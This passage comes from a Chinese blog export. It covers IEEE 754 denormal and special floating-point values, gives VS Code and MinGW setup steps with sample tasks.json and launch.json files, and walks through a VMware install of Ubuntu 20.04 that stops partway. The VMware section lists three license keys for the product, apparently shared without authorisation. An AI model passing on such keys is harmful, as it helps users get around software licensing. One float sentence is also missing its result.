<p>除了规约浮点数，IEEE754-1985标准采用非规约浮点数，用来解决填补绝对值意义下最小规格数与零的距离。（举例说，正数下，最大的非规格数等于最小的规格数。而一个浮点数编码中，如果exponent=0，且尾数部分不为零，那么就按照非规约浮点数来解析）非规约浮点数源于70年代末IEEE浮点数标准化专业技术委员会酝酿浮点数二进制标准时，Intel公司对<strong>渐进式下溢出（gradual underflow）</strong>的力荐。当时十分流行的DEC VAX机的浮点数表示采用了<strong>突然式下溢出（abrupt underflow）</strong>。如果没有渐进式下溢出，那么0与绝对值最小的浮点数之间的距离（gap）将大于相邻的小浮点数之间的距离。例如单精度浮点数的绝对值最小的规约浮点数是$1.0\times 2^{-126}$，它与绝对值次小的规约浮点数之间的距离为$2^{-126}\times 2^{-23}=2^{-149}$。如果不采用渐进式下溢出，那么绝对值最小的规约浮点数与0的距离是相邻的小浮点数之间距离的$2^{23}$倍，可以说是非常突然的下溢出到0。这种情况的一种糟糕后果是：两个不等的小浮点数X与Y相减，结果将是。训练有素的数值分析人员可能会适应这种限制情况，但对于普通的程序员就很容易陷入错误了。采用了渐进式下溢出后将不会出现这种情况。例如对于单精度浮点数，指数部分实际最小值是（-126），对应的尾数部分从$1.1111\ldots 11$, $1.1111\ldots 10$一直到$0.0000\ldots 10$, $0.0000\ldots 01$，$0.0000\ldots 00$相邻两小浮点数之间的距离（gap）都是$2^{-126}\times 2^{-23}=2^{-149}$；而与0最近的浮点数（即最小的非规约数）也是$2^{-126}\times 2^{-23}=2^{-149}$。</p>
<h2 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h2><p>这里有三个特殊值需要指出：</p>
<ol>
<li>如果指数是0并且尾数的<strong>小数部分</strong>是0，这个数±0（和符号位相关）</li>
<li>如果指数 = $2^{e}-1$并且尾数的<strong>小数部分</strong>是0，这个数是±∞（同样和符号位相关）</li>
<li>如果指数 = $2^{e}-1$并且尾数的<strong>小数部分</strong>非0，这个数表示为<strong>非数（NaN）</strong>。</li>
</ol>
<p>以上规则，总结如下：</p>
<table>
<thead>
<tr>
<th align="center">形式</th>
<th align="center">指数</th>
<th align="center">小数部分</th>
</tr>
</thead>
<tbody><tr>
<td align="center">零</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">非规约形式</td>
<td align="center">0</td>
<td align="center">大于0小于1</td>
</tr>
<tr>
<td align="center">规约形式</td>
<td align="center">$1$到$2^{e}-2$</td>
<td align="center">大于等于1小于2</td>
</tr>
<tr>
<td align="center">无穷</td>
<td align="center">$2^{e}-1$</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">NaN</td>
<td align="center">$2^{e}-1$</td>
<td align="center">非0</td>
</tr>
</tbody></table>
<h1 id="单精度浮点数是怎样构成的？"><a href="#单精度浮点数是怎样构成的？" class="headerlink" title="单精度浮点数是怎样构成的？"></a>单精度浮点数是怎样构成的？</h1><p><strong>单精度浮点数格式</strong>是一种数据类型，在计算机存储器中占用4个位元（32 bits），利用“浮点”（浮动小数点）的方法，可以表示一个范围很大的数值。</p>
<p>在IEEE 754-2008的定义中，32-bit base 2格式被正式称为<strong>binary32</strong>格式。这种格式在IEEE 754-1985被定义为<strong>single</strong>，即单精度。需要注意的是，在更早的一些计算机系统中，也存在着其他4字节的浮点数格式。</p>
<p>第1位表示正负，中间8位表示指数，后23位储存有效数位（有效数位是24位）。</p>
<p>第一位的正负号0代表正，1代表负。</p>
<p>中间八位共可表示$2^8=256$个数，指数可以是二补码；或0到255，0到126代表-127到-1，127代表零，128-255代表1-128。</p>
<p>有效数位最左手边的1并不会储存，因为它一定存在（二进制的第一个有效数字必定是1）。换言之，有效数位是24位，实际储存23位。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/1180px-Float_example.svg.png" alt="float"></p>
<p>$sign=+1$</p>
<p>$exponent=(-127)+124=-3$</p>
<p>$fraction=1+2^{-2}=1.25$</p>
<p>$value=(+1)\times 2^{-3}\times 1.25=+0.15625$</p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>打造一个属于你的 VS Code</title>
    <url>/VS-Code-Config/</url>
    <content><![CDATA[<p>Windows 安装并配置 Visual Studio Code 过程记录</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/SuperPung/Pictures/main/Exitalk.png"></p>
<blockquote>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Visual_Studio_Code_1.35_icon.svg/64px-Visual_Studio_Code_1.35_icon.svg.png" alt="Visual Studio Code 1.35 icon.svg"></p>
<p>Visual Studio Code（简称 VS Code）是一个由微软开发，同时支持 Windows、Linux 和 macOS 等操作系统的免费代码编辑器，它支持测试，并内置了 Git 版本控制功能，同时也具有开发环境功能，例如代码补全（类似于 IntelliSense）、代码片段和代码重构等。该编辑器支持用户个性化配置，例如改变主题颜色、键盘快捷方式等各种属性和参数，同时还在编辑器中内置了扩展程序管理的功能。</p>
<p>在 2019 年的 Stack Overflow 组织的开发者调研中，VS Code 被认为是最受开发者欢迎的开发环境，据调查 87317 名受访者中有 50.7% 的受访者声称正在使用VS Code。</p>
<hr>
<p><em>参考文献</em></p>
<p><em>[1]维基百科编者. Visual Studio Code[G/OL]. 维基百科, 2020(20201221)[2020-12-21]. <a href="https://zh.wikipedia.org/w/index.php?title=Visual_Studio_Code&amp;oldid=63349035">https://zh.wikipedia.org/w/index.php?title=Visual_Studio_Code&amp;oldid=63349035</a>.</em></p>
</blockquote>
<p>本文使用的软件版本及系统环境：</p>
<ul>
<li>Windows 10</li>
<li>Visual Studio Code x64 1.52.1</li>
<li>MinGW-w64 GCC-8.1.0</li>
</ul>
<p>本文部分代码参考<a href="https://www.zhihu.com/question/30315894/answer/154979413">知乎@谭九鼎</a>。</p>
<p>更多详细内容请参考<a href="https://code.visualstudio.com/docs">VS Code 官方文档</a>。</p>
<h1 id="下载-VS-Code"><a href="#下载-VS-Code" class="headerlink" title="下载 VS Code"></a>下载 VS Code</h1><p>访问<a href="https://code.visualstudio.com/">VS Code 官网</a>，点击左侧“Download for Windows”即可下载。</p>
<blockquote>
<p>下载速度慢？试试将下载地址中的“az764295.vo.msecnd.net”替换为国内镜像“vscode.cdn.azure.cn”。</p>
</blockquote>
<h1 id="安装-VS-Code"><a href="#安装-VS-Code" class="headerlink" title="安装 VS Code"></a>安装 VS Code</h1><p>双击打开下载好的 exe 文件，选择“我同意此协议”，选择目标位置，选择开始菜单文件夹。</p>
<p>选择附加任务，勾选“将‘通过 Code 打开’操作添加到 Windows 资源管理器文件、目录上下文菜单”两项：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/code%E5%AE%89%E8%A3%851.jpg"></p>
<p>下一步，点击“安装”，稍等即可安装成功。</p>
<h1 id="下载编译器-MinGW-w64"><a href="#下载编译器-MinGW-w64" class="headerlink" title="下载编译器 MinGW-w64"></a>下载编译器 MinGW-w64</h1><p>VS Code 只是一个文本编辑器（text editor），而不是 IDE（集成开发环境）。所以要想编译并运行程序，需要安装编译器。</p>
<blockquote>
<p>Mingw-w64 是自由及开放源代码软件开发环境，用于创建 Microsoft Windows 应用程序。从 2005–2008 从 MinGW (<em>Minimalist GNU for Windows</em>)分枝出来。</p>
<p>Mingw-w64 包括对 GCC、GNU Binutils 的 Windows 版本的移植（汇编器、链接器、库文件管理器），一套自由可分发的 Windows 特定的头文件与静态导入库以使用 Windows API，一个 Windows 本地版本的 GNU 的调试器，以及其它多种工具。</p>
<p>Mingw-w64 可运行于本地 Microsoft Windows 平台，”cross-native”在 MSYS2 或 Cygwin。Mingw-w64 能生成 32-或 64-位可执行程序，运行于 <code>i686-w64-mingw32</code> 或 <code>x86_64-w64-mingw32</code> 目标平台。</p>
</blockquote>
<p>访问<a href="https://sourceforge.net/projects/mingw-w64/files/">SourceForge MinGW-w64</a>，选择下方“MinGW-W64 GCC-8.1.0”中的“x86_64-posix-seh”，点击即可下载。</p>
<blockquote>
<p>注：下载可能需要国际网络环境。</p>
</blockquote>
<h1 id="安装编译器-MinGW-w64"><a href="#安装编译器-MinGW-w64" class="headerlink" title="安装编译器 MinGW-w64"></a>安装编译器 MinGW-w64</h1><p>将下载好的 7z 压缩包解压，存放在 C 盘根目录下，记录 g++ 的绝对路径（如<code>C:\mingw64\bin</code>）。</p>
<p>右击“此电脑”，选择“属性”，选择“高级系统设置”，选择“环境变量”，在下方“系统变量”中找到“Path”，双击：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F1.png"></p>
<p>新建，填入记录的路径：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F2.png"></p>
<p>逐级确定以保存。</p>
<p>验证。按下 <code>Win</code> + <code>R</code>，运行 <code>cmd</code>。</p>
<p>输入 <code>gcc</code> 回车，若提示 <code>gcc: fatal error: no input files</code>，则说明配置成功；若提示“‘gcc’不是内部或外部命令”，则说明环境变量添加失败；否则配置失败，应该按照上述操作重新配置。</p>
<p>输入 <code>gcc -v</code> 回车，可以查看 gcc 的版本。</p>
<h1 id="配置-VS-Code"><a href="#配置-VS-Code" class="headerlink" title="配置 VS Code"></a>配置 VS Code</h1><h2 id="安装扩展（Extensions）"><a href="#安装扩展（Extensions）" class="headerlink" title="安装扩展（Extensions）"></a>安装扩展（Extensions）</h2><p>推荐安装扩展：</p>
<ul>
<li>Chinese (Simplified) Language Pack for Visual Studio Code</li>
<li>C/C++</li>
<li>Code Runner</li>
</ul>
<p>其他推荐扩展：</p>
<ul>
<li>One Dark Pro</li>
<li>Bracket Pair Colorizer</li>
<li>Rainbow Brackets</li>
<li>Code Spell Checker</li>
<li>Git Graph</li>
<li>Git History</li>
<li>filesize</li>
<li>Markdown All in One</li>
<li>Markdown PDF</li>
<li>markdownlint</li>
<li>Tabnine Autocomplete AI: JavaScript, Python, TypeScript, PHP, Go, Java, Ruby, C/C++, HTML/CSS, C#, Rust, SQL, Bash, Kotlin, React</li>
<li>x86 and x86_64 Assembly</li>
</ul>
<h2 id="配置-json-文件"><a href="#配置-json-文件" class="headerlink" title="配置 json 文件"></a>配置 json 文件</h2><p>创建工作区文件夹，用于存放代码，路径中不要出现中文、空格等符号，然后用 VS Code 打开此文件夹。</p>
<ul>
<li><p>按下 <code>Ctrl</code>+<code>Shift</code>+<code>P</code> ，输入“C/C++”，选择“C/C++: Edit configurations (UI)”，可以发现文件夹下自动创建了子文件夹 <code>.vscode</code>，其中包含 <code>c_cpp_properties.json</code> 文件。</p>
<p>参考代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Win32&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;includePath&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C:\\mingw64\\lib\\gcc\\x86_64-w64-mingw32\\8.1.0\\include&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;defines&quot;</span>: [<span class="string">&quot;_DEBUG&quot;</span>, <span class="string">&quot;UNICODE&quot;</span>, <span class="string">&quot;_UNICODE&quot;</span>],</span><br><span class="line">      <span class="attr">&quot;compilerPath&quot;</span>: <span class="string">&quot;C:\\mingw64\\bin\\g++.exe&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;cStandard&quot;</span>: <span class="string">&quot;c11&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;cppStandard&quot;</span>: <span class="string">&quot;c++17&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;intelliSenseMode&quot;</span>: <span class="string">&quot;$&#123;default&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/c_cpp_propeerties_zyk.png"></p>
</li>
<li><p>按下 <code>Ctrl</code>+<code>Shift</code>+<code>P</code> ，输入“tasks”，选择“Tasks: Configure Default Build Task”，选择创建 <code>tasks.json</code> 文件，选择“Others”，VS Code 会在<code>.vscode</code> 文件夹下创建 <code>tasks.json</code> 文件。</p>
<p>参考代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://code.visualstudio.com/docs/editor/tasks</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span>: [&#123;</span><br><span class="line">        <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;Compile&quot;</span>, <span class="comment">// 任务名称，与launch.json的preLaunchTask相对应</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;g++&quot;</span>,   <span class="comment">// 要使用的编译器，C用gcc</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;$&#123;file&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-o&quot;</span>,    <span class="comment">// 指定输出文件名，不加该参数则默认输出a.exe，Linux下默认a.out</span></span><br><span class="line">            <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-g&quot;</span>,    <span class="comment">// 生成和调试有关的信息</span></span><br><span class="line">            <span class="string">&quot;-m64&quot;</span>,  <span class="comment">// 不知为何有时会生成16位程序而无法运行，此条可强制生成64位的</span></span><br><span class="line">            <span class="string">&quot;-Wall&quot;</span>, <span class="comment">// 开启额外警告</span></span><br><span class="line">            <span class="string">&quot;-static-libgcc&quot;</span>,     <span class="comment">// 静态链接libgcc，一般都会加上</span></span><br><span class="line">            <span class="string">&quot;-fexec-charset=GBK&quot;</span>, <span class="comment">// 生成的程序使用GBK编码，不加这条会导致Win下输出中文乱码；繁体系统改成BIG5</span></span><br><span class="line">        ], <span class="comment">// 编译的命令，其实相当于VSC帮你在终端中输了这些东西</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;process&quot;</span>, <span class="comment">// process是把预定义变量和转义解析后直接全部传给command；shell相当于先打开shell再输入命令，所以args还会经过shell再解析一遍</span></span><br><span class="line">        <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span> <span class="comment">// 不为true时ctrl shift B就要手动选择了</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;presentation&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;echo&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;reveal&quot;</span>: <span class="string">&quot;always&quot;</span>, <span class="comment">// 执行任务时是否跳转到终端面板，可以为always，silent，never。具体参见VSC的文档，即使设为never，手动点进去还是可以看到</span></span><br><span class="line">            <span class="attr">&quot;focus&quot;</span>: <span class="literal">false</span>,     <span class="comment">// 设为true后可以使执行task时焦点聚集在终端，但对编译C/C++来说，设为true没有意义</span></span><br><span class="line">            <span class="attr">&quot;panel&quot;</span>: <span class="string">&quot;shared&quot;</span>   <span class="comment">// 不同的文件的编译信息共享一个终端面板</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;problemMatcher&quot;</span>:<span class="string">&quot;$gcc&quot;</span> <span class="comment">// 捕捉编译时终端里的报错信息到问题面板中，修改代码后需要重新编译才会再次触发</span></span><br><span class="line">        <span class="comment">// 本来有Lint，再开problemMatcher就有双重报错，但MinGW的Lint效果实在太差了；用Clangd可以注释掉</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/tasks_zyk.png"></p>
</li>
<li><p>按下 <code>Ctrl</code>+<code>Shift</code>+<code>P</code> ，输入“launch”，选择“Debug: Open launch.json”，VS Code 会在<code>.vscode</code> 文件夹下创建 <code>launch.json</code> 文件。</p>
<p>参考代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://code.visualstudio.com/docs/cpp/launch-json-reference</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [&#123;</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;(gdb) Launch&quot;</span>, <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>, <span class="comment">// 配置类型，对于C/C++可认为此处只能是cppdbg，由cpptools提供；不同编程语言不同</span></span><br><span class="line">        <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>, <span class="comment">// 可以为launch（启动）或attach（附加）</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span>, <span class="comment">// 将要进行调试的程序的路径，或&quot;$&#123;workspaceFolder&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span>: [], <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>, <span class="comment">// 设为true时程序将暂停在程序入口处，相当于在main上打断点，或true</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span>, <span class="comment">// 调试程序时的工作目录，此为工作区文件夹；改成$&#123;fileDirname&#125;可变为文件所在目录</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span>: [], <span class="comment">// 环境变量</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span>: <span class="literal">true</span>, <span class="comment">// 使用单独的cmd窗口，与其它IDE一致；为false时使用内置终端，或false</span></span><br><span class="line">        <span class="attr">&quot;internalConsoleOptions&quot;</span>: <span class="string">&quot;neverOpen&quot;</span>, <span class="comment">// 如果不设为neverOpen，调试时会跳到“调试控制台”选项卡，你应该不需要对gdb手动输命令吧？</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>, <span class="comment">// 指定连接的调试器，可以为gdb或lldb。但我没试过lldb</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;C:\\mingw64\\bin\\gdb.exe&quot;</span>, <span class="comment">// 调试器路径，Windows下后缀不能省略，Linux下则不要</span></span><br><span class="line">        <span class="attr">&quot;setupCommands&quot;</span>: [</span><br><span class="line">            &#123; <span class="comment">// 模板自带，好像可以更好地显示STL容器的内容，具体作用自行Google</span></span><br><span class="line">                <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Enable pretty-printing for gdb&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;ignoreFailures&quot;</span>: <span class="literal">false</span> <span class="comment">// 或true</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;Compile&quot;</span> <span class="comment">// 调试前执行的任务，一般为编译程序。与tasks.json的label相对应</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/launch_zyk.png"></p>
</li>
</ul>
<h1 id="运行-C-程序"><a href="#运行-C-程序" class="headerlink" title="运行 C++ 程序"></a>运行 C++ 程序</h1><p>在工作区文件夹内，<code>.vscode</code> 文件夹外，新建一个 <code>.cpp</code> 文件，运行以检验 VS Code 配置成果。</p>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>让 Ubuntu 来到你的 Windows 上</title>
    <url>/Win-VM-Ubuntu-20-04/</url>
    <content><![CDATA[<p>Windows&amp;VMware&amp;Ubuntu_20.04 安装虚拟机过程记录</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/SuperPung/Pictures/main/Exitalk.png"></p>
<p>本文使用的软件版本及系统环境：</p>
<ul>
<li>Windows 10 (amd64)</li>
<li>Ubuntu 20.04.1 LTS (amd64)</li>
<li>VMware Workstation Pro 16.1.0</li>
</ul>
<h1 id="下载-Ubuntu-20-04-1-amd64-iso文件"><a href="#下载-Ubuntu-20-04-1-amd64-iso文件" class="headerlink" title="下载 Ubuntu 20.04.1 amd64 iso文件"></a>下载 Ubuntu 20.04.1 amd64 iso文件</h1><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a>，点击“ubuntu-releases”-“20.04/”-“ubuntu-20.04.1-desktop-amd64.iso”即可下载。</p>
<p>或直接点此<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/20.04/ubuntu-20.04.1-desktop-amd64.iso">下载链接</a>进行下载。</p>
<h1 id="下载-VMware-Workstation-Pro"><a href="#下载-VMware-Workstation-Pro" class="headerlink" title="下载 VMware Workstation Pro"></a>下载 VMware Workstation Pro</h1><p>访问<a href="https://www.vmware.com/cn.html">VMware中文官网</a>，点击“Menu”-“下载”-“产品下载”-“Workstation Pro”：</p>
<p><img src="https://raw.githubusercontent.com/SuperPung/Pictures/main/vmware%E7%BD%91%E7%AB%99.png"></p>
<p>选择版本后，点击右侧“下载免费试用版：Windows”，即可无需登录直接下载。</p>
<h1 id="安装-VMware-Workstation-Pro"><a href="#安装-VMware-Workstation-Pro" class="headerlink" title="安装 VMware Workstation Pro"></a>安装 VMware Workstation Pro</h1><p>选择安装目标及任何其他功能：</p>
<p><img src="https://raw.githubusercontent.com/SuperPung/Pictures/main/vm%E5%AE%89%E8%A3%851.PNG"></p>
<p>输入 VMware Workstation 16 的许可证密钥：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/vm%E5%AE%89%E8%A3%85%E8%AE%B8%E5%8F%AF%E8%AF%81.PNG"></p>
<p>可选择以下密钥之一输入：</p>
<blockquote>
<p>FG78K-0UZ<a href="tel:15-085">15-085</a>TQ-TZQXV-XV0CD</p>
<p>ZA11U-DVY97-M81LP-4MNEZ-X3AW0</p>
<p>YU<a href="tel:102-44">102-44</a>D86-48D2Z-Z4Q5C-MFAWD</p>
</blockquote>
<p>安装成功。</p>
<h1 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h1><p>打开 VMware Workstation 16，点击“创建新的虚拟机”，打开新建虚拟机向导：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%91%E5%AF%BC.PNG"></p>
<p>选择“自定义(高级)”，继续选择虚拟机硬件兼容性：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E7%A1%AC%E4%BB%B6%E5%85%BC%E5%AE%B9%E6%80%A7.PNG"></p>
<p>默认，进行下一步，选择客户机操作系统：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E5%AE%A2%E6%88%B7%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.PNG"></p>
<p>选择“Microsoft Windows”，版本“Windows 10 x64”，进行下一步，安装客户机操作系统：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E5%AE%89%E8%A3%85%E5%AE%A2%E6%88%B7%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.PNG"></p>
<p>选择“稍后安装操作系统”，进行下一步，选择客户机操作系统：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E9%80%89%E6%8B%A9%E5%AE%A2%E6%88%B7%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.PNG"></p>
<p>选择“Linux”，版本“Ubuntu 64 位”，进行下一步，命名虚拟机：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%91%BD%E5%90%8D%E8%99%9A%E6%8B%9F%E6%9C%BA.PNG"></p>
<p>设置虚拟机名称和位置后，进行下一步，处理器配置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E5%A4%84%E7%90%86%E5%99%A8%E9%85%8D%E7%BD%AE.PNG"></p>
<p>默认分配 2 个处理器、每个处理器 1 个内核，进行下一步，内存配置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E5%86%85%E5%AD%98.PNG"></p>
<p>分配 4GB 内存，进行下一步，选择网络类型：</p>
<p><img src="https://cdn.jsdelivr.net/gh/SuperPung/Pictures/%E7%BD%91%E7%BB%9C%E7%B1%BB%E5%9E%8B.PNG"></p>
<p>默认选择“使用网络地址转换(NAT)”，进行下一步，选择 I/O 控制器类型：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/IO%E6%8E%A7%E5%88%B6%E5%99%A8%E7%B1%BB%E5%9E%8B.PNG"></p>
<p>默认选择“LSI Logic”，进行下一步，选择磁盘类型：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%A3%81%E7%9B%98%E7%B1%BB%E5%9E%8B.PNG"></p>
<p>默认选择“SCSI”，进行下一步，选择磁盘：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%80%89%E6%8B%A9%E7%A3%81%E7%9B%98.PNG"></p>
<p>默认选择“创建新虚拟磁盘”，进行下一步，指定磁盘容量：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%8C%87%E5%AE%9A%E7%A3%81%E7%9B%98%E5%AE%B9%E9%87%8F.PNG"></p>
<p>将最大磁盘大小设置为 30.0GB，默认选择“将虚拟磁盘拆分成多个文件”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%8C%87%E5%AE%9A%E7%A3%81%E7%9B%98%E5%AE%B9%E9%87%8F30.PNG"></p>
<p>进行下一步，指定磁盘文件，选择存储位置后，创建完成：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B7%B2%E5%87%86%E5%A4%87%E5%A5%BD%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA.PNG"></p>
<p>点击“完成”，编辑虚拟机设置：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE.PNG"></p>
<p>点击“CD/DVD (SATA)”，在右侧“连接”处选择“使用 ISO 映像文件”，选择下载好的 iso 文件：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AEcddvd.PNG"></p>
<p>“确定”。</p>
<h1 id="开启虚拟机，安装-Ubuntu"><a href="#开启虚拟机，安装-Ubuntu" class="headerlink" title="开启虚拟机，安装 Ubuntu"></a>开启虚拟机，安装 Ubuntu</h1><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%851.PNG"></p>
<p>等待……</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%852.PNG"></p>
<p>选择语言：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E9%80%89%E6%8B%A9%E8%AF%AD%E8%A8%80.PNG"></p>
<p>选择中文(简体)：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E9%80%89%E6%8B%A9%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87.PNG"></p>
<p>点击“安装 Ubuntu”，选择键盘布局：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E9%80%89%E6%8B%A9%E9%94%AE%E7%9B%98%E5%B8%83%E5%B1%80.PNG"></p>
<p>默认，继续，选择安装选项：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E6%9B%B4%E6%96%B0.PNG"></p>
<p>取消“安装 Ubuntu 时下载更新”以节约安装的时间：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E5%8F%96%E6%B6%88%E6%9B%B4%E6%96%B0.PNG"></p>
<p>继续，选择安装类型“Erase disk and install Ubuntu”后，继续将改动写入磁盘：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E9%80%89%E6%8B%A9%E7%A3%81%E7%9B%98.PNG"></p>
<p>继续选择地区：</p>
